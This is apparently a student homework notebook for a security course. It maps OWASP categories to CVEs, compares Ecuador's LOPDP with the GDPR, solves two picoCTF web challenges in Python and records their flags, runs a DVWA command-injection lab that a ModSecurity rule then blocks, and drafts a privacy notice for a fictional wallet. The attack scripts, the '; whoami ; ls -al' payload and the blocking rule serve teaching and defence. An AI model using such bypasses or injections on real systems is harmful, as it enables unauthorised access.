# **HOMEWORK 3 — Web Defense & Privacy Compliance**

**Authors:** Mateo Vivanco (00328476) · Roberto Villafuerte (00329429)  
**Date:** April 27, 2026  
**Course:** Seguridad Informática — CMP-5006

This notebook covers the five deliverables required by `homework3.md`: an OWASP Top 10:2025 → CWE → 2025 CVE mapping; the eight LOPDP data-subject rights and an enforcement comparison against the GDPR; two solved picoCTF Web Exploitation challenges with executable code; a DVWA command-injection lab attacked at security level Low and then defended with a ModSecurity CRS reverse proxy; and a one-page QuitoCash privacy notice plus three data-minimization decisions.


## 1. OWASP & CWE Mapping

The selected categories come from the **OWASP Top 10:2025** release and are mapped to representative CWEs and recent 2025 CVEs documented in NVD.

| OWASP Top 10:2025 category | CWE | Recent CVE | Impact summary |
|---|---|---|---|
| **A01: Broken Access Control** | **CWE-352: Cross-Site Request Forgery (CSRF)** | **CVE-2025-41254** — Spring Framework STOMP CSRF bypass | Spring Framework applications using STOMP over WebSocket can be tricked into accepting unauthorized messages sent from a victim's authenticated context. The result is an integrity and access-control failure in real-time messaging features, because actions that should require an intentional authorized request may be triggered without proper CSRF protection. |
| **A02: Security Misconfiguration** | **CWE-611: Improper Restriction of XML External Entity Reference (XXE)** | **CVE-2025-12531** — IBM InfoSphere Information Server XXE | IBM InfoSphere Information Server 11.7.0.0 through 11.7.1.6 processes XML in a way that allows XML external entity injection. A remote attacker can expose sensitive information or consume memory resources, showing how an unsafe XML-parser configuration creates both confidentiality and availability impact. |
| **A05: Injection** | **CWE-89: SQL Injection** | **CVE-2025-25257** — Fortinet FortiWeb SQL injection | Affected Fortinet FortiWeb GUI versions allowed unauthenticated attackers to send crafted HTTP/HTTPS requests that executed unauthorized SQL code or commands. Because FortiWeb is itself a Web Application Firewall, exploitation undermines a defensive control and may compromise the confidentiality, integrity, and availability of every system protected behind that edge. |

*Sources:* OWASP Top 10:2025 (A01, A02, A05); NVD entries for CVE-2025-41254, CVE-2025-12531, CVE-2025-25257.


## 2. Ecuadorian Context: LOPDP

### 2.1 Eight data-subject rights in Ecuador's LOPDP

The **Ley Orgánica de Protección de Datos Personales (LOPDP)** develops the rights of the *titular* in Chapter III. The eight operational rights map to Articles 12, 13, 14, 15, 16, 17, 19, and 20 (Article 18 lists exceptions; Articles 21–23 add child-specific protections, prior-consultation duties, and digital education).

| # | LOPDP right | Article | Practical meaning |
|---:|---|---:|---|
| 1 | **Information** (*derecho a la información*) | Art. 12 | The data subject must be told the purposes, legal basis, retention period, controller identity, data categories, recipients, transfers, and how to exercise rights. |
| 2 | **Access** (*derecho de acceso*) | Art. 13 | The data subject may know and obtain access to all personal data held by the controller, without justifying the request. |
| 3 | **Rectification and update** (*rectificación y actualización*) | Art. 14 | The data subject may request correction or updating of inaccurate or incomplete personal data. |
| 4 | **Deletion** (*eliminación*) | Art. 15 | Deletion may be requested when, for example, the purpose has been fulfilled, retention has expired, consent is revoked, the processing violates legal principles, or there is a legal obligation to delete. |
| 5 | **Object / oppose** (*oposición*) | Art. 16 | The data subject may object to processing, including direct marketing and profiling, unless the controller proves overriding legitimate grounds or legal-claim reasons. |
| 6 | **Portability** (*portabilidad*) | Art. 17 | The data subject may receive personal data in a compatible, structured, interoperable, machine-readable format, or ask that it be transmitted to another controller when technically possible. |
| 7 | **Suspension of processing** (*suspensión del tratamiento*) | Art. 19 | Processing may be suspended while accuracy is challenged, when processing is unlawful and limitation is preferred over deletion, or while an objection is being reviewed. |
| 8 | **Not subject to fully automated decisions** (*decisiones automatizadas*) | Art. 20 | The data subject may demand explanation, criteria, data sources, observations, and challenge rights when automated assessments or profiling produce legal effects or significantly affect rights and freedoms. |

> **Note on "anulación" (Art. 18).** Article 18 lists *anulación* among the rights subject to specific exceptions, but does not develop it as a standalone operational article in the way that access, rectification, deletion, opposition, portability, suspension, or rights against automated decisions are developed. For that reason, this work treats the eight operational rights as Articles 12, 13, 14, 15, 16, 17, 19, and 20.

### 2.2 Enforcement: Ecuador's Superintendencia vs. EU GDPR

Both regimes share the same enforcement logic — the controller must make rights practical, and the supervisory authority can investigate, order correction, and sanction non-compliance — but differ in scale and maturity. Ecuador uses a single national authority, the **Superintendencia de Protección de Datos Personales**; the EU uses independent supervisory authorities in each Member State, coordinated through cross-border cooperation and the European Data Protection Board.

| Element | Ecuador LOPDP | EU GDPR |
|---|---|---|
| **Regulator model** | Single national data-protection authority oversees personal-data protection in Ecuador. | Each Member State has an independent supervisory authority; cross-border cases use cooperation and consistency mechanisms. |
| **How rights are enforced** | The Superintendencia acts on a complaint or *ex officio*, resolves complaints, orders corrective measures, conducts technical audits, issues rules, and applies sanctions. | Supervisory authorities have investigative powers (audits, access to information) plus corrective powers (warnings, orders to comply, processing bans, administrative fines). |
| **Response timing for rights requests** | LOPDP repeatedly sets a **15-day** response period for key rights (access, rectification/update, deletion, opposition). | GDPR requires action without undue delay and generally within **one month**, extendable for complex or numerous requests. |
| **Sanctions** | Calculated as a percentage of business volume: **0.1 %–0.7 %** for minor infractions, **0.7 %–1 %** for serious infractions. | Fines up to **EUR 10 M or 2 %** of worldwide annual turnover, or up to **EUR 20 M or 4 %** for the most serious infringements. |
| **Practical comparison** | A centralized national compliance model with lower statutory fine ceilings and a still-maturing institutional practice. | A more mature cross-border regime with higher maximum penalties and EU-wide coordination. |

*Sources:* Official LOPDP text (gob.ec); GDPR Articles 12, 20, 21, 22, 58, and 83.

## 3. picoCTF — Hands-on Web Exploitation

Two Web Exploitation challenges were solved on picoCTF. Both solvers below are pure-Python and re-runnable as long as the picoCTF instance URL is still active. The captured flag is preserved in the cell output so it remains visible in the deliverable even when the challenge instance has been recycled.


### 3.1 Crack The Gate 1

**Logic.** Inspecting the page source revealed an HTML comment hinting at a developer-only header `X-Dev-Access: yes`. Adding that header to a `POST /login` request bypasses the password check and the server responds with the flag in JSON. The lesson is that hidden HTML comments are *not* a security boundary — secrets and dev backdoors must never ship to the client.


In [1]:
# POST REQUEST TO URL
import requests

url = 'http://amiable-citadel.picoctf.net:65113/login'

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Dev-Access': 'yes'  # Header found in comments of HTML code
}

data = {
    'email': 'ctf-player@picoctf.org',
    'password': ''
}

response = requests.post(url, headers=headers, data=data)

print('Flag found:', response.json()['flag'])


Flag found: picoCTF{brut4_f0rc4_3e21b3a3}


### 3.2 Local Authority

**Logic.** The login form ships client-side JavaScript that hashes the entered credentials and compares the result against a hard-coded admin hash before redirecting to `admin.php`. Because the check happens in the browser, sending the known hash directly to `admin.php` (skipping `login.php` entirely) returns the protected page and the flag. This is the canonical *broken access control via client-side authentication* pattern: trust must live on the server.


In [2]:
import requests
import re

# Make sure this port is still correct for your active instance!
admin_url = 'http://saturn.picoctf.net:51470/admin.php'

# We bypass login.php entirely and send the hash directly to admin.php
payload = {
    'hash': '2196812e91c29df34f5e217cfd639881'
}

response = requests.post(admin_url, data=payload)

print("\n--- ADMIN.PHP RESPONSE ---")
flag_match = re.search(r'picoCTF\{.*?\}', response.text)

if flag_match:
    print(f"\nFound the flag: {flag_match.group(0)}")



--- ADMIN.PHP RESPONSE ---

Found the flag: picoCTF{j5_15_7r4n5p4r3n7_a8788e61}


## 4. WAF Deployment — DVWA Command Injection

This lab is run locally in Docker. The attack runs only against a local DVWA container intentionally configured as vulnerable.


### 4.1 DVWA setup

Run DVWA in Docker:

```bash
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
```

Browse to `http://localhost:8080`, run `/setup.php` to create the database, log in with `admin` / `password`, and set **DVWA Security = Low**.


### 4.2 Attack — command injection at security Low

In *Vulnerabilities → Command Injection*, the form takes an IP address and the PHP backend concatenates the user input directly into a shell call. With DVWA Security = Low there is no input filtering, so the command separator `;` chains arbitrary commands. Payload used:

```text
; whoami ; ls -al
```

The page returns `www-data` followed by the directory listing of the `exec/` module, proving arbitrary command execution under the web-server account.

![DVWA command injection (before WAF)](evidence/Command-Injection.jpeg)


### 4.3 Defense — ModSecurity CRS reverse proxy

Inspect the running DVWA container to learn its internal IP (e.g. `172.17.0.2`):

```bash
docker inspect <DVWA_CONTAINER_ID> | grep IPAddress
```

Start a ModSecurity Core Rule Set (CRS) container as a reverse proxy in front of DVWA, listening on host port 80:

```bash
docker run -d -p 80:8080 \
  -e BACKEND=http://172.17.0.2 \
  --name dvwa-waf \
  owasp/modsecurity-crs:apache
```

Append a custom rule that blocks the shell-command separators `;` and `|` in **any HTTP argument**, returning HTTP 403 and logging a clear message. The transformations `t:none,t:urlDecodeUni` make sure the regex sees the URL-decoded form, so an evasion attempt like `%3B` is also caught:

```bash
docker exec -i dvwa-waf sh -c 'cat >> /etc/modsecurity.d/owasp-crs/rules/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf' <<'EOF'
SecRule ARGS "@rx [;|]" \
  "id:10001,phase:2,deny,status:403,t:none,t:urlDecodeUni,msg:'Blocked Command Injection Attempt'"
EOF
docker restart dvwa-waf
```

The active rule:

```apache
SecRule ARGS "@rx [;|]" \
  "id:10001,phase:2,deny,status:403,t:none,t:urlDecodeUni,msg:'Blocked Command Injection Attempt'"
```


### 4.4 Validation — same payload, blocked by WAF

Browsing DVWA through the WAF (`http://localhost/`) and submitting the same `; whoami ; ls -al` payload yields **HTTP 403 Forbidden**:

![ModSecurity 403 Forbidden response](evidence/Injection-Blocked.jpeg)

Inspecting the WAF container's logs confirms rule `10001` matched the payload pattern `[;|]` on argument `ARGS:ip` and denied the request in phase 2:

![ModSecurity audit log entry](evidence/Docker-Logs.jpeg)

```text
ModSecurity: Access denied with code 403 (phase 2). Pattern match "[;|]" at ARGS:ip.
[id "10001"] [msg "Blocked Command Injection Attempt"] [uri "/vulnerabilities/exec/"]
```


### 4.5 Defensive interpretation

The WAF is a **compensating control at the HTTP layer**: it filters requests before they reach DVWA, but the underlying PHP code remains exploitable. The proper application-level fix is to (1) validate the input server-side with `filter_var($ip, FILTER_VALIDATE_IP)` and avoid concatenating user input into a shell command, and (2) when an external process is unavoidable, use a shell-less process API such as `proc_open()` with an argument array, or otherwise escape arguments strictly with `escapeshellarg()`. A WAF reduces exploitability while remediation work happens — it is not a substitute for fixing the code.

*Sources:* official DVWA repository (digininja/DVWA); OWASP ModSecurity CRS Docker image; OWASP CRS documentation.

## 5. Privacy Engineering — QuitoCash

### 5.1 One-page Privacy Notice

**QuitoCash Privacy Notice**  
**Controller:** QuitoCash S.A.S., Quito, Ecuador.  
**Contact:** privacy@quitocash.ec  
**Data Protection Officer:** dpo@quitocash.ec

**What we process.** Identity and contact data, phone number, account credentials, transaction records, selected recipient phone numbers, device and security logs, support communications, and legally required KYC / AML information. We do **not** require uploading the full address book — recipients can be entered manually.

**Purposes and legal bases.**  
• *Account creation, authentication, sending and receiving money, transaction history, customer support* — **contract necessity** (GDPR Art. 6(1)(b); LOPDP).  
• *Identity verification, AML / KYC records, tax and regulator reporting, fraud reporting* — **legal obligation** (GDPR Art. 6(1)(c); LOPDP).  
• *Security logs, abuse-prevention signals, service-integrity analytics* — **legitimate interest** (GDPR Art. 6(1)(f)), balanced against user rights.  
• *Optional marketing, optional contact discovery, the optional AI spending-habit prediction* — **consent** (GDPR Art. 6(1)(a); LOPDP), revocable at any time.

**AI spending-habit prediction (automated decision-making clause).** When enabled, QuitoCash uses transaction categories, amounts, dates, and merchant descriptions to generate budgeting insights such as *"high transport spending this month"*. **This feature is optional and is not used, by itself, to approve, deny, price, suspend, or limit accounts, credit, or transfers.** Users may turn it off, request an explanation of the logic, ask what data was used, challenge a result, and request human review. If QuitoCash were ever to use automated decision-making producing legal effects or similarly significant effects, it would provide prior notice and safeguards under **LOPDP Art. 20** and **GDPR Art. 22**, and would rely on explicit consent, contract necessity, or specific legal authorization.

**Sharing and transfers.** Data is shared only with payment processors, banks, KYC / AML providers, cloud and security providers, customer-support tools, and public authorities when legally required. International transfers use contractual safeguards, security controls, and transfer-impact review where required by GDPR and LOPDP.

**Retention.** Transaction and KYC records are kept only as long as needed for service delivery, legal limitation periods, accounting, fraud prevention, and financial-sector obligations. Optional AI-prediction data is deleted or deactivated when the user disables the feature, except where a separate legal retention obligation applies.

**Your rights.** Information, access, rectification / update, deletion, opposition, portability, suspension / restriction, and rights related to automated decisions.  
• **Portability (GDPR Art. 20 / LOPDP Art. 17).** Users may request a CSV or JSON export of personal data they provided and transaction history processed by automated means, or ask QuitoCash to transmit it directly to another provider where technically feasible. Available in-app under **Settings → Privacy Center → Export my data**, or by email to privacy@quitocash.ec.  
• **Opposition (GDPR Art. 21 / LOPDP Art. 16).** Users may object to processing based on legitimate interest and may always object to direct marketing and related profiling. One-click opt-outs are available under **Settings → Privacy Center → Opposition**, with confirmation by email. Ecuadorian requests are handled under LOPDP time limits (15 days); EU requests under GDPR time limits (one month).

**Complaints.** Users in Ecuador may complain to the **Superintendencia de Protección de Datos Personales**. Users in the EEA may complain to their local GDPR supervisory authority.


### 5.2 Data minimization — three data points QuitoCash should *not* collect

1. **Full address book / contact list of non-users.** Tempting for phone-number discovery, but it captures third-party data from people who never joined the app and have no relationship with QuitoCash. Compliant alternative: manual recipient entry, or a consent-based privacy-preserving contact-matching protocol with hashed look-ups.

2. **Continuous precise GPS / background geolocation.** Tempting for fraud scoring, but excessive for ordinary money transfers and a serious privacy intrusion. Compliant alternatives: country-level location, IP-based risk signals, device-history fingerprints, or *event-based* (login / transfer-time only) coarse location when strictly necessary.

3. **SMS inbox, email receipts, or browser history for the AI spending feature.** These sources reveal sensitive private behavior unrelated to QuitoCash transactions (medical, political, sexual, family). The AI feature should rely *only* on transaction data already processed by the app, remain optional, be explainable, and be one-click disableable.


## References

1. OWASP Foundation. **OWASP Top 10:2025**. https://owasp.org/Top10/2025/
2. OWASP Foundation. **A01:2025 Broken Access Control**. https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/
3. OWASP Foundation. **A02:2025 Security Misconfiguration**. https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/
4. OWASP Foundation. **A05:2025 Injection**. https://owasp.org/Top10/2025/A05_2025-Injection/
5. NIST NVD. **CVE-2025-41254**. https://nvd.nist.gov/vuln/detail/CVE-2025-41254
6. NIST NVD. **CVE-2025-12531**. https://nvd.nist.gov/vuln/detail/CVE-2025-12531
7. NIST NVD. **CVE-2025-25257**. https://nvd.nist.gov/vuln/detail/CVE-2025-25257
8. Gobierno del Ecuador. **Ley Orgánica de Protección de Datos Personales (LOPDP)**. https://www.gob.ec/sites/default/files/regulations/2022-08/Ley-Org%C3%A1nica-Protecci%C3%B3n-Datos-Personales.pdf
9. GDPR-info.eu. **Article 6 — Lawfulness of processing**. https://gdpr-info.eu/art-6-gdpr/
10. GDPR-info.eu. **Article 12 — Transparent information and modalities for rights**. https://gdpr-info.eu/art-12-gdpr/
11. GDPR-info.eu. **Article 20 — Right to data portability**. https://gdpr-info.eu/art-20-gdpr/
12. GDPR-info.eu. **Article 21 — Right to object**. https://gdpr-info.eu/art-21-gdpr/
13. GDPR-info.eu. **Article 22 — Automated individual decision-making, including profiling**. https://gdpr-info.eu/art-22-gdpr/
14. GDPR-info.eu. **Article 58 — Powers**. https://gdpr-info.eu/art-58-gdpr/
15. GDPR-info.eu. **Article 83 — Administrative fines**. https://gdpr-info.eu/art-83-gdpr/
16. digininja. **Damn Vulnerable Web Application (DVWA)**. https://github.com/digininja/DVWA
17. Core Rule Set Project. **OWASP ModSecurity CRS Docker images**. https://github.com/coreruleset/modsecurity-crs-docker
18. Core Rule Set Project. **OWASP CRS Documentation**. https://coreruleset.org/docs/
